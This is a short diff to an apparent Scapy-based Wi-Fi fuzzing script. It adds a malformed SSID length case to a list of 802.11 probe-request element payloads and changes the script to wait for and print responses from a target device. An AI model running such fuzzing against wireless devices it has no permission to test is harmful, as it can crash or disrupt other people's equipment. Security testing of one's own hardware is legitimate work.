@@ -24,6 +24,7 @@ for i in range(1,256):
   for x in exploits[:]:
     tofuzz = [
     "Dot11Elt(ID=x,info='00')", 
+    "Dot11Elt(ID='SSID', len=x,info='00')", 
     "Dot11Elt(ID='SSID', len=9,info=x)", 
     "Dot11Elt(ID='RATES', info=x)", 
     "Dot11Elt(ID='EXT RATES ',info=x)",  
@@ -44,8 +45,9 @@ for i in range(1,256):
     "Dot11Elt(ID='COUNTRY BAND TRIPLET',info=x)", 
     "Dot11Elt(ID='COUNTRY EXT TRIPLET',info=x)"]
     for a in tofuzz[:]:
-      resp = hexdump(sendp(
+      resp = hexdump(srp(
         RadioTap()/
         Dot11(type=0,subtype=0100,addr2=target)/
         Dot11ProbeReq()/
-        a))
+        a,timeout=4))
+      print(resp)
